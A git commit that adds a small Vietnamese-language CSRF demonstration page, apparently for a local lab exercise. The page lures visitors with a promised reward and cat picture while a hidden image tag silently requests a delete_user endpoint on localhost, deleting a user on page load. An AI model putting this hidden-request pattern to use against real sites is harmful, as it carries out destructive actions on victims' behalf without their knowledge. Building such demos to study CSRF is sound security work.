8a5d13b0eab4d0cdbfabff5abef7ba4f53a18442
vukha12 <kha15964@gmail.com>
2025-09-30 09:52:51 +0700

    done csrf

---
+++ sources/test-csrf.php
@@ -0,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Trang web tấn công</title>
+</head>
+
+<body>
+    <h1>Nhấn vào đây để nhận thưởng!</h1>
+    <p>Bấm vào hình ảnh dưới đây để xem một bức ảnh mèo dễ thương!</p>
+
+    <img src="http://localhost:8081/delete_user.php?id=5" style="display:none;" onerror="alert('Người dùng đã bị xóa!')">
+
+    <img src="https://example.com/cute_cat.jpg" alt="Mèo dễ thương">
+</body>
+
+</html>
